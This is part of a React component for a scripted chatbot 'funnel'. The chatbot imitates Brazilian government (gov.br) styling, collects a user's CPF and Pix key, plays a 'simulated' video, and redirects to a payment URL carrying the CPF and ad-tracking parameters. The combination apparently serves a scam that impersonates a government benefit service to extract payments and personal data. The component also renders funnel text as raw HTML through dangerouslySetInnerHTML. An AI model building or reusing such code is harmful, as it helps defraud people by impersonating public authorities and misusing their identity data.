  }, [messages, isLoadingStep, loadingMessage, currentImageDetails, currentDisplayMessage, currentVideoMessage, isTextInputActive, isBotTyping]);


  const handleOptionClick = (option: ChatOption) => {
    const userMessageId = `user-${Date.now()}`;
    setMessages(prev => [...prev, { id: userMessageId, sender: 'user', text: option.text }]);
    
    // Clear UI from previous bot step
    setCurrentDisplayMessage(null);
    setCurrentImageDetails(null);
    setIsLoadingStep(false);
    setLoadingMessage(null);
    // Video placeholder and text input are cleared by handleUserActionAndNavigate if step type changes

    setIsBotTyping(true); // Start typing immediately

    if (option.action === 'setChavePixToUserCPF') {
        const cpfToSet = flowVariables.userCPF || "CPF não disponível"; // Uses the formatted CPF
        setFlowVariables(prev => ({...prev, chavePix: cpfToSet}));
    }

    if (option.action === 'redirectToPayment' && option.paymentUrl) {
        let finalPaymentUrl = formatText(option.paymentUrl);
        try {
            const url = new URL(finalPaymentUrl);
             // Append relevant UTM params and gclid from initialParams if not already in paymentUrl
             Object.entries(initialParams).forEach(([key, value]) => {
                if (value && !url.searchParams.has(key) && ['gclid', 'utm_source', 'utm_campaign', 'utm_medium', 'utm_content'].includes(key)) {
                    url.searchParams.set(key, value as string);
                }
            });
            // Add CPF to URL if not present
            if (initialParams.cpf && !url.searchParams.has('cpf')) {
                url.searchParams.set('cpf', initialParams.cpf);
            }
            window.location.href = url.toString();
        } catch (e) {
            console.error("Invalid payment URL:", finalPaymentUrl, e);
            setMessages(prev => [...prev, { id: `err-payment-url-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro ao tentar processar o pagamento." }]);
        }
        setIsBotTyping(false); // Stop typing if redirecting
        return;
    }

    if (option.nextStep) {
      handleUserActionAndNavigate(option.nextStep);
    } else if (!option.action) { // No next step AND no action
        console.warn("SimulatedChatFlow: Option clicked with no nextStep and no action:", option);
        setIsBotTyping(false); // Stop typing if no further action
    }
  };

  const handleVideoThumbnailClick = async () => {
    const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
    if (stepConfig?.type !== 'displayVideo') return;

    setShowVideoPlaceholderOverlay(false);
    // Clear video specific UI elements for the current step
    // videoPlaceholderData.current = null; // Keep it if we want to show the video playing
    // setCurrentVideoMessage(null); // Message was intro, no need after click

    setIsBotTyping(true); // Start typing for the next step

    if (stepConfig.nextStep) {
        handleUserActionAndNavigate(stepConfig.nextStep as string);
    } else {
        setIsBotTyping(false); // No next step, stop typing
    }
  };

  const handleTextInputFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!currentTextInputConfig || !textInputValue.trim()) {
        const tempMsgId = `err-input-${Date.now()}`;
        // Display temporary error message directly in chat
        setMessages(prev => [...prev, {id: tempMsgId, sender: 'bot', text: "Por favor, preencha o campo."}]);
        // Optionally remove the temporary message after a few seconds
        setTimeout(() => setMessages(prev => prev.filter(m => m.id !== tempMsgId)), 2000);
        return;
    }

    setMessages(prev => [...prev, { id: `user-input-${Date.now()}`, sender: 'user', text: textInputValue }]);
    
    // Clear text input UI elements for the current step
    setIsTextInputActive(false);
    // setCurrentTextInputConfig(null); // Cleared by handleUserActionAndNavigate

    setIsBotTyping(true); // Start typing for the next step

    if (currentTextInputConfig.variableToSet === 'chavePix') {
        setFlowVariables(prev => ({...prev, chavePix: textInputValue.trim()}));
    }
    setTextInputValue(""); // Clear input field after submission

    const nextStepKey = (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep)?.nextStep;
    if (nextStepKey) {
        handleUserActionAndNavigate(nextStepKey);
    } else {
        setIsBotTyping(false); // No next step, stop typing
    }
  };

  const getIconComponent = (iconName?: string) => {
    if (!iconName) return null;
    // Using heroicons or similar for more gov-like feel might be an option
    if (iconName.includes('success_checkmark')) return <CheckCircle size={20} style={{ color: '#27AE60', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
    if (iconName.includes('warning_amber')) return <AlertTriangle size={20} style={{ color: '#F7B731', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
    if (iconName.includes('currency_dollar_gov_style')) { // Custom style for gov currency/money
      return <span style={{fontSize: '20px', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0, filter: 'grayscale(1) brightness(0.8)'}}>💰</span>;
    }
    // Add more icon mappings as needed
    return null;
  }


  return (
    <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px', backgroundColor: '#f0f0f0' }}>
      <audio ref={audioRef} style={{ display: 'none' }} />

      {videoPlaceholderData.current && !isBotTyping && !isLoadingStep && (
        <div className="intro-video-section" style={{ marginBottom: '15px', padding: '10px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          {currentVideoMessage && <p className="bot-message" style={{ background: '#e9ecef', color: '#333', borderRadius: '12px', boxShadow: 'none', padding: '10px 15px', marginBottom: '10px', whiteSpace: 'pre-line' }}>{currentVideoMessage}</p>}
          <div
            onClick={handleVideoThumbnailClick}
            className="video-placeholder-wrapper"
            style={{
              position: 'relative', width: '100%', aspectRatio: '16/9',
              margin: '0 auto', borderRadius: '8px', overflow: 'hidden',
              backgroundColor: '#333', cursor: 'pointer', display: 'flex', justifyContent: 'center', alignItems: 'center'
            }}
          >
            {showVideoPlaceholderOverlay && (
              <div
                style={{
                  position: 'absolute', top: 0, left: 0, right: 0, bottom: 0,
                  background: 'rgba(0,0,0,0.6)', display: 'flex', flexDirection: 'column',
                  justifyContent: 'center', alignItems: 'center', color: 'white', zIndex: 10
                }}
              >
                <VolumeX size={48} />
                <span style={{ marginTop: '10px', fontSize: '18px', textAlign: 'center' }}>
                  {formatText(videoPlaceholderData.current?.thumbnailText)}
                </span>
              </div>
            )}
             {/* Could add a simple "Video Playing" text or mini player if !showVideoPlaceholderOverlay */}
             { !showVideoPlaceholderOverlay && <span style={{color: 'white'}}>Vídeo Iniciado (Simulado)</span> }
          </div>
        </div>
      )}


      {isLoadingStep && loadingMessage && !isBotTyping && (
        <div className="loading-step-container" style={{ textAlign: 'center', padding: '20px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)'}}>
          <Loader2 className="animate-spin" size={32} style={{ margin: '0 auto 10px auto', color: '#1451b4' }} />
          <p style={{ fontSize: '16px', color: '#333', whiteSpace: 'pre-line' }}>{loadingMessage}</p>
        </div>
      )}

      {currentImageDetails && !isBotTyping && !isLoadingStep && (
        <div className="message-container bot-message-container image-display-block">
          <div className="message bot-message" style={{ padding: '5px' }}>
            {currentImageDetails.message && <p style={{ marginBottom: '8px', padding: '5px 10px', whiteSpace: 'pre-line'}}>{currentImageDetails.message}</p>}
            <Image
              src={currentImageDetails.url}
              alt={currentImageDetails.alt}
              width={300} // Adjust as needed
              height={200} // Adjust as needed
              data-ai-hint={currentImageDetails.aiHint || "illustration"}
              style={{ borderRadius: '8px', maxWidth: '100%', height: 'auto', display: 'block' }}
            />
          </div>
        </div>
      )}


      {currentDisplayMessage && !isLoadingStep && !isBotTyping && (
        <div className={`message-container bot-message-container display-message-block`} style={{alignSelf: 'flex-start', maxWidth: '90%', width: 'auto', display: 'flex'}}>
           {/* Avatar removed based on previous request
           <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" width={32} height={32} className="bot-avatar" data-ai-hint="government logo" />
           */}
           <div className="message bot-message" style={{width: 'auto', maxWidth: '100%'}}> {/* Ensure bot messages can take full width needed */}
              {currentDisplayMessage.displayTitle && <h3 style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '17px', color: '#0056b3', display: 'flex', alignItems: 'center' }}>
                {getIconComponent(currentDisplayMessage.displayIcon)}
                <span dangerouslySetInnerHTML={{ __html: currentDisplayMessage.displayTitle }} />
              </h3>}
              {currentDisplayMessage.text && <p style={{ marginBottom: currentDisplayMessage.displayDetails ? '12px' : '0', whiteSpace: 'pre-line' }} dangerouslySetInnerHTML={{__html: currentDisplayMessage.text}} />}
              {currentDisplayMessage.displayDetails && (
                <div className="details-grid" style={{ borderTop: '1px solid #e0e0e0', paddingTop: '10px', display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '6px 12px', fontSize: '14px' }}>
                  {Object.entries(currentDisplayMessage.displayDetails).map(([key, value]) => (
                    <React.Fragment key={key}>
                      <span style={{ fontWeight: '500', color: '#555' }} dangerouslySetInnerHTML={{__html: key}}/>
                      <span style={{ color: '#333' }} dangerouslySetInnerHTML={{__html: value}}/>
                    </React.Fragment>
                  ))}
                </div>
              )}
               {/* Note display for displayMessage steps */}
               { (currentDisplayMessage.displayIcon && (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.data as FlowStepDataDisplayMessage)?.note) && (
                <p style={{fontSize: '12px', color: '#666', marginTop: '10px', borderTop: '1px dashed #ddd', paddingTop: '8px'}}>
                    <strong>Nota:</strong> {formatText(((funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep).data as FlowStepDataDisplayMessage)?.note)}
                </p>
              )}
           </div>
        </div>
      )}

      {messages.map((msg) => (
          <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
            {/* Avatar removed based on previous request
            {msg.sender === 'bot' && (
                <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" width={32} height={32} className="bot-avatar" data-ai-hint="government logo"/>
            )}
            */}
            <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
              {msg.text && <span style={{whiteSpace: 'pre-line'}} dangerouslySetInnerHTML={{__html: msg.text}} />}
              {/* Render options only if it's a bot message, options exist, and bot is not currently typing and text input is not active */}
              {msg.sender === 'bot' && msg.options && !isBotTyping && !isTextInputActive && (
                <div className="options-container">
                  {msg.options.map(opt => (
                    <button
                      key={opt.text + (opt.nextStep || '') + (opt.action || '') + (opt.paymentUrl || '')} // More unique key
                      onClick={() => handleOptionClick(opt)}
                      className={`chat-option-button ${opt.style || ''}`} // Allow custom styles via funnel definition
                       dangerouslySetInnerHTML={{__html: opt.text}} // For bolding or other simple HTML in options
                    />
                  ))}
                </div>
              )}
            </div>
          </div>
        )
      )}

      {isTextInputActive && currentTextInputConfig && !isBotTyping && (
        <form onSubmit={handleTextInputFormSubmit} className="chat-input-form-container" style={{ display: 'flex', marginTop: '10px', padding: '5px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          <input
            type="text"
            value={textInputValue}
            onChange={(e) => setTextInputValue(e.target.value)}
            placeholder={formatText(currentTextInputConfig.placeholder)}
            className="chat-text-input" // General class for styling text input
            style={{ flexGrow: 1, border: '1px solid #ccc', borderRadius: '15px', padding: '10px 15px', marginRight: '8px', fontSize: '15px' }}
            autoFocus
          />
          <button type="submit" className="chat-send-button" style={{ background: '#1451b4', color: 'white', border: 'none', borderRadius: '50%', width: '40px', height: '40px', display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer' }}>
            <Send size={20} />
          </button>
        </form>
      )}

      {isBotTyping && (
         <div className="message-container bot-message-container">
            {/* Avatar removed based on previous request
             <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" width={32} height={32} className="bot-avatar" data-ai-hint="government logo"/>
            */}
            <div className="message bot-message typing-indicator">
                <span className="dot"></span><span className="dot"></span><span className="dot"></span>
            </div>
        </div>
      )}
      <div ref={chatEndRef} />
      <style jsx>{`
        .simulated-chat-container::-webkit-scrollbar { display: none; } /* Hide scrollbar for Chrome, Safari, Opera */
        .simulated-chat-container { -ms-overflow-style: none; scrollbar-width: none; } /* Hide scrollbar for IE, Edge, Firefox */

        .message-container {
          display: flex;
          margin-bottom: 12px;
          max-width: 90%; /* Messages don't take full width, looks more chat-like */
        }
        .bot-message-container {
          align-self: flex-start; /* Bot messages to the left */
        }
        .user-message-container {
          align-self: flex-end; /* User messages to the right */
          flex-direction: row-reverse; /* Makes the message bubble appear on the right */
        }

        .message {
          padding: 10px 15px;
          border-radius: 18px; /* Rounded corners for messages */
          line-height: 1.4;
          font-size: 15px;
          word-wrap: break-word; /* Prevent long words from breaking layout */
          box-shadow: 0 1px 2px rgba(0,0,0,0.1);
          width: auto; /* Fit content */
          max-width: 100%; /* Ensure it doesn't overflow container */
        }
        .bot-message {
          background-color: #e9ecef; /* Light grey for bot messages */
          color: #333;
          border-bottom-left-radius: 4px; /* Gives a "tail" effect */
        }
        .user-message {
          background-color: #007bff; /* Primary blue for user messages/responses */
          color: white;
          border-bottom-right-radius: 4px; /* "Tail" effect on the right */
          margin-left: auto; /* Align user message to the right of its container */
        }

        /* Avatar Styles (kept for reference if re-enabled) */
        .bot-avatar {
          border-radius: 50%;
          margin-right: 8px;
          align-self: flex-end; /* Align with bottom of message bubble */
          object-fit: cover; /* Ensures image covers the circle nicely */
          flex-shrink: 0; /* Prevent avatar from shrinking */
        }
        .bot-message-container .bot-avatar { margin-left: 0; margin-right: 8px;} /* Standard avatar on left */
        .typing-indicator-container .bot-avatar { margin-left: 0; margin-right: 8px;}


        .options-container {
          margin-top: 10px;
          display: flex;
          flex-wrap: wrap; /* Allow options to wrap to next line */
          align-items: flex-start; /* Align wrapped items to the start of the line */
          justify-content: flex-start; /* Align options to the left for bot */
          gap: 8px;
        }
        .chat-option-button {
          background-color: #007bff; /* Blue similar to user messages */
          color: white;
          border: none;
          padding: 10px 20px; /* Comfortable padding */
          border-radius: 25px; /* Pill-shaped buttons */
          cursor: pointer;
          font-size: 15px;
          font-weight: 500;
          transition: background-color 0.2s;
          text-align: center;
          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .chat-option-button:hover {
          background-color: #0056b3; /* Darker blue on hover */
        }
        
        /* Specific styles for gov-themed buttons if defined in funnel */
        .chat-option-button.primary_cta_button_gov_style {
          background-color: #16a34a; /* Green for primary gov action */
          border-color: #16a34a;
          color: white;
          font-weight: bold;
        }
        .chat-option-button.primary_cta_button_gov_style:hover {
          background-color: #15803d;
          border-color: #15803d;
        }
        .chat-option-button.secondary_link_button_gov_style {
          background-color: transparent;
          border: none;
          color: #007bff; /* Standard link blue */
          text-decoration: underline;
          padding: 4px 0; /* Minimal padding for link-like buttons */
          box-shadow: none;
          font-size: 14px;
        }
        .chat-option-button.secondary_link_button_gov_style:hover {
          color: #0056b3;
          background-color: transparent;
        }
         .chat-option-button.destructive_link_button_gov_style {
          background-color: transparent;
          border: none;
          color: #dc3545; /* Red for destructive actions */
          text-decoration: underline;
          padding: 4px 0;
          box-shadow: none;
          font-size: 14px;
        }
        .chat-option-button.destructive_link_button_gov_style:hover {
          color: #c82333;
          background-color: transparent;
        }


        .typing-indicator {
          display: inline-flex; /* Aligns dots in a row */
          align-items: center;
          padding: 10px 15px; /* Same padding as messages for consistency */
        }
        .typing-indicator .dot {
          width: 8px;
          height: 8px;
          margin: 0 2px; /* Spacing between dots */
          background-color: #aaa; /* Grey dots */
          border-radius: 50%;
          animation: bounce 1.4s infinite;
        }
        .typing-indicator .dot:nth-child(2) { animation-delay: 0.2s; }
        .typing-indicator .dot:nth-child(3) { animation-delay: 0.4s; }

        @keyframes bounce {
          0%, 80%, 100% { transform: scale(0); }
          40% { transform: scale(1); }
        }
        .display-message-block .bot-message { /* Ensure displayMessage block can use full width if needed */
            width: auto; /* Override fixed width for this block if any was set previously */
            max-width: 100%;
        }
      `}</style>
    </div>
  );
};

export default SimulatedChatFlow;

    